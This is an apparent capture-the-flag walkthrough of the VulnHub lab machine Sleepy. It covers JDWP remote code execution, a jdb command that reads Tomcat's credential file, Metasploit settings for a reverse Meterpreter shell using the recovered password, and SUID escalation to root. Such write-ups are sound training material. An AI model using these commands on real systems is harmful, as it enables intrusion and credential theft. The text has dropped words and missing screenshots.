<p id=p0>In this article, we are going to solve a <span class='token pointer' id='tok-68-0' style='color:red'>machine</span>which was posted as another <span class='token pointer' id='tok-68-1' style='color:red'>VM</span>challenge on the VulnHub <span class='token pointer' id='tok-68-2' style='color:red'>website.</span>The machine is named Sleepy. Check the <span class='token pointer' id='tok-68-3' style='color:red'>link</span>for the same at the end of this article. So, let's get started. </p><p id=p42>I started with running a complete <span class='token pointer' id='tok-68-4' style='color:red'>Nmap</span><span class='token pointer' id='tok-68-5' style='color:red'>scan</span>on the <span class='token pointer' id='tok-68-6' style='color:red'>target machine.</span>got only 3 <span class='token pointer' id='tok-68-7' style='color:red'>Ports</span>open on the target machine. It can be seen in the below <span class='token pointer' id='tok-68-8' style='color:red'>screenshot.</span></p><p id=p72>After that, I start exploring all the <span class='token pointer' id='tok-68-9' style='color:red'>ports</span>one by one. On Port No 21, I tried the anonymous <span class='token pointer' id='tok-68-10' style='color:red'>Login</span>on the target machine, but I did not find any interesting information in the public directory. Anonymous successful login can be seen in the below screenshot. </p><p id=p118>This vulnerability alone was not sufficient for the <span class='token pointer' id='tok-68-11' style='color:red'>exploitation</span>of the target machine. So, I started to explore the other ports which were found open during the Nmap. The second interesting Port which was identified during Nmap scan was 9001 which was being used for <span class='token pointer' id='tok-68-12' style='color:red'>JDWP</span><span class='token pointer' id='tok-68-13' style='color:red'>(Java</span>Debug Wire Protocol). I started googling and found that the version of JDWP that was being used on the target machine was vulnerable to remote code execution, and a <span class='token pointer' id='tok-68-14' style='color:red'>Metasploit</span><span class='token pointer' id='tok-68-15' style='color:red'>exploit</span>was also available for the same. It can be seen in the below screenshot. </p><p id=p210>After that, I quickly launched the Metasploit <span class='token pointer' id='tok-68-16' style='color:red'>framework</span>to set up the attack on the target machine. I filled up all the required <span class='token pointer' id='tok-68-17' style='color:red'>parameters</span>and started the attack on the target machine. Other details can be seen in the below screenshot. </p><p id=p251>Let me describe few things in the above screenshot. First of all, I have setup all the required parameters for the exploit such as RHOST < Target IP >, RPORT < Target PORT >, <span class='token pointer' id='tok-68-18' style='color:red'>LPORT</span>< Local IP for Reverse Connection>, LPORT < Local Port for Reverse Connection >. After that, I ran a command check. Check is a command which is used to verify whether the target machine is vulnerable or not. The output of the command gives a smile on my face as it was showing that target machine was vulnerable for the exploit. So, I fired the Metasploit gun on the target machine hoping for the reverse connection. However, the final output was not as expected. It says that "Exploit Completed, but no session was created." </p><p id=p380>After that, I tried many different ways to run this exploit, but it was not successful. So, I decided to explore some other method to break the target machine. After doing some research on it, I found a way in which I will be adding an <span class='token pointer' id='tok-68-19' style='color:red'>Apache</span>module and doing some <span class='token pointer' id='tok-68-20' style='color:red'>configuration</span>changes. Steps are given below. </p><p id=p437>First of all, I installed the module <span class='token pointer' id='tok-68-21' style='color:red'>libapache2-mod-jk.</span>It can be seen in the below screenshot. </p><p id=p453>As we can see in the above screenshot, the Apache module is successfully installed and configured. </p><p id=p469>After that, I did some changes in the configuration of the module.Configuration Changes File Name: /etc/apache2/mods-available/jk.conf </p><p id=p485>In the highlighted area on the above screenshot, you can see that I have changed JKWorkerFile <span class='token pointer' id='tok-68-22' style='color:red'>/etc/libapache2-mod-jk/workers.properties</span>to /etc/apache2/workers.properties file Path. </p><p id=p506>Now, I copied the worker.properties file from /etc/libapache2-mod-jk/workers.properties to /etc/apache2/ folder. It can be seen in the below screenshot. </p><p id=p525>It is time to change the <span class='token pointer' id='tok-68-23' style='color:red'>IP Address</span>the worker.properties file. It can be seen in the above screenshot. </p><p id=p545>As can be seen in the highlighted area we have added the target machine <span class='token pointer' id='tok-68-24' style='color:red'>IP address</span>the worker.host. </p><p id=p564>After this change, I have done one more change in the Apache default configuration file for the exploit to work.File Name: /etc/apache2/sites-available/000-default.conf </p><p id=p586>In the above screenshot, highlighted line is added by me. </p><p id=p596>Now it is time to hit the <span class='token pointer' id='tok-68-25' style='color:red'>localhost</span>on the <span class='token pointer' id='tok-68-26' style='color:red'>browser.</span></p><p id=p607>We can see in the above screenshot; my machine is now linked with the target machine, and the target machine <span class='token pointer' id='tok-68-27' style='color:red'>Tomcat</span>is running on my localhost. However, I cannot access the <span class='token pointer' id='tok-68-28' style='color:red'>Manage App</span>as it requires the password. </p><p id=p646>So, I connected the target machine using JDB through port 9001 without the <span class='token pointer' id='tok-68-29' style='color:red'>credentials</span>it can be seen in the below screenshot. </p><p id=p668>To access the Manage App section on this machine, we require the password. The login credentials in Tomcat are stored in the "/etc/tomcat/tomcat-users.xml" file. So, I wrote some Java code for reading this file. It can be seen in the below screenshot. </p><p id=p710>Command Used: </p><p id=p712>jdb -attach 192.168.1.70:9001threadsinterrupt 0x1a1 {Interrupting the Main Thread}print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("tail -n 3 /etc/tomcat/tomcat-users.xml").getInputStream())).readLine()) {Extracting the credentials from the target machine} </p><p id=p735>As can be seen in the above screenshot, by running the <span class='token pointer' id='tok-68-30' style='color:red'>commands</span>one by one I successfully retrieved the credentials from the file. Now that we have the credentials we can login in the tomcat Manage App section. </p><p id=p773>As can be seen in the above screenshot, I have successfully logged in into the application. After that, I used Metasploit exploit for shell access. Used commands are given below. </p><p id=p803>use <span class='token pointer' id='tok-68-31' style='color:red'>exploit/multi/http/tomcat_mgr_uploadset</span>HttpPassword Gu3SSmYStR0NgPa$sw0rD!set HttpUsername sl33pyset rhost 127.0.0.1set rport 80set LHOST 192.168.1.120In the below screenshot, I ran above command one by one. </p><p id=p825><span class='token pointer' id='tok-68-32' style='color:red'>Hacking</span><span class='token pointer' id='tok-68-33' style='color:red'>Ethical</span>â€“ Resources (InfoSec) </p><p id=p831>As can be seen in the above screenshot, after setting all the required options I hit the exploit, and successfully got the <span class='token pointer' id='tok-68-34' style='color:red'>Meterpreter</span><span class='token pointer' id='tok-68-35' style='color:red'>Reverse connection</span>of the target machine. After running few commands, I got to know that this is the limited shell access and I need to take the <span class='token pointer' id='tok-68-36' style='color:red'>root</span>access to complete the machine. </p><p id=p888>I tried a few methods, but those methods were not working. So, I started to use <span class='token pointer' id='tok-68-37' style='color:red'>Linux</span><span class='token pointer' id='tok-68-38' style='color:red'>g0tmilk</span><span class='token pointer' id='tok-68-39' style='color:red'>Escalation</span>checklist. This is a very helpful checklist for enumeration. You may check the <span class='token pointer' id='tok-68-40' style='color:red'>URL</span>that is given in the reference section. After spending some time on the enumeration, I got a command which returns all the <span class='token pointer' id='tok-68-41' style='color:red'>executables</span>that could be run as owner, not the user who started it. The output of the command can be seen in the below screenshot. </p><p id=p969>In the above screenshot, the list of the executables is given which could be run with this user. While exploring these executables, I found an interesting file which says, <span class='token pointer' id='tok-68-42' style='color:red'>"Error Opening Terminal."</span>can be seen in the below screenshot. </p><p id=p1009>After doing some reverse engineering on this executable file. I found that this is used to include and execute other commands as a root. So, I ran this command in the first terminal, and I took another session to kill the process. </p><p id=p1051>As can be seen in the below screenshot, I ran a few commands <span class='token pointer' id='tok-68-43' style='color:red'>in T1,</span>after that I ran process, and at the same time I ran <span class='token pointer' id='tok-68-44' style='color:red'>PS command to</span>the process ID of that process and after getting the process ID I ran the kill command to terminate the process which gave me <span class='token pointer' id='tok-68-45' style='color:red'>root shell</span>the T1 screen. </p><p id=p1113>Finally, I go a root shell on this machine. Let's read the flag in the </p><p id=p1130>As can be seen in the above screenshot, I got the flag. And now, the Challenge is Completed! </p><p id=p1148>  </p>